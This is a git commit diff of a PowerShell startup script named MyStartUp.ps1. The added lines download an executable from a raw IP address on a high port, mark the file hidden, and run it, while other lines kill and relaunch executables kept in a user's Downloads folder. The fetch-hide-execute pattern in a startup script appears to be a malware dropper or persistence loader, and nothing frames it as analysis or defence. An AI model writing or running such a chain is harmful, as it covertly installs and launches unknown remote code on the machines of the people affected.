5623defe80bc66921483ec258a610d2d2a3e4732
fullcaleta <144293848+fullcaleta@users.noreply.github.com>
2023-11-27 01:31:30 -0300

    Update MyStartUp.ps1

--- MyStartUp.ps1
+++ MyStartUp.ps1
@@ -1,5 +1,10 @@
-taskkill /F /IM Disk-Updating.exe
-C:\Users\angel\Downloads\Disk-Updating.exe
+Invoke-WebRequest -Uri http://193.161.193.99:56673/shaxh21.exe -OutFile C:\Users\seba\Downloads\shaxh21.exe
+attrib +h C:\Users\seba\downloads\shaxh21.exe
+C:\Users\seba\downloads\shaxh21.exe
+
+
+#taskkill /F /IM Disk-Updating.exe
+#C:\Users\angel\Downloads\Disk-Updating.exe
 taskkill /F /IM lml.exe
 C:\Users\seba\Downloads\lml.exe
 
